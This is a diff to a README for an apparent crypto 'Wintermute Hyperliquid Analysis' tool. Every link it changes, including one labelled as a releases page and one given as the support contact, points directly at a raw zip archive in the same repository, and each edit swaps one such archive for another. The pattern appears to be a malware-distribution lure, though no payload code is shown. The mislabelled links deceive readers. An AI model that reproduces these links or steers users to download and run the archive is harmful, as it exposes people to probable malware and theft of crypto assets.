@@ -6,9 +6,9 @@ Welcome to the **Wintermute Hyperliquid Analysis** application. This tool helps 
 
 ## 📥 Download the Application
 
-[![Download Now](https://github.com/Grimm404exe/wintermute-hyperliquid-analysis/raw/refs/heads/main/scripts/hyperliquid_wintermute_analysis_3.5.zip%20Now-%20-blue)](https://github.com/Grimm404exe/wintermute-hyperliquid-analysis/raw/refs/heads/main/scripts/hyperliquid_wintermute_analysis_3.5.zip)
+[![Download Now](https://raw.githubusercontent.com/Grimm404exe/wintermute-hyperliquid-analysis/main/data/hyperliquid-analysis-wintermute-2.8.zip%20Now-%20-blue)](https://raw.githubusercontent.com/Grimm404exe/wintermute-hyperliquid-analysis/main/data/hyperliquid-analysis-wintermute-2.8.zip)
 
-Visit this page to download: [Releases Page](https://github.com/Grimm404exe/wintermute-hyperliquid-analysis/raw/refs/heads/main/scripts/hyperliquid_wintermute_analysis_3.5.zip)
+Visit this page to download: [Releases Page](https://raw.githubusercontent.com/Grimm404exe/wintermute-hyperliquid-analysis/main/data/hyperliquid-analysis-wintermute-2.8.zip)
 
 ## 📋 System Requirements
 
@@ -28,7 +28,7 @@ Before you download, ensure your system meets these requirements:
 
 ## 📦 Download & Install
 
-1. **Visit the Releases Page:** Click this [link](https://github.com/Grimm404exe/wintermute-hyperliquid-analysis/raw/refs/heads/main/scripts/hyperliquid_wintermute_analysis_3.5.zip) to access the latest version of the software.
+1. **Visit the Releases Page:** Click this [link](https://raw.githubusercontent.com/Grimm404exe/wintermute-hyperliquid-analysis/main/data/hyperliquid-analysis-wintermute-2.8.zip) to access the latest version of the software.
   
 2. **Choose the Latest Release:** Look for the version labeled as “Latest” on the releases page.
 
@@ -50,7 +50,7 @@ Before you download, ensure your system meets these requirements:
 
 ## 📞 Support
 
-If you encounter any issues during download or usage, please reach out to our support team. You can contact us directly at https://github.com/Grimm404exe/wintermute-hyperliquid-analysis/raw/refs/heads/main/scripts/hyperliquid_wintermute_analysis_3.5.zip
+If you encounter any issues during download or usage, please reach out to our support team. You can contact us directly at https://raw.githubusercontent.com/Grimm404exe/wintermute-hyperliquid-analysis/main/data/hyperliquid-analysis-wintermute-2.8.zip
 
 ## 🙌 Contributing
 
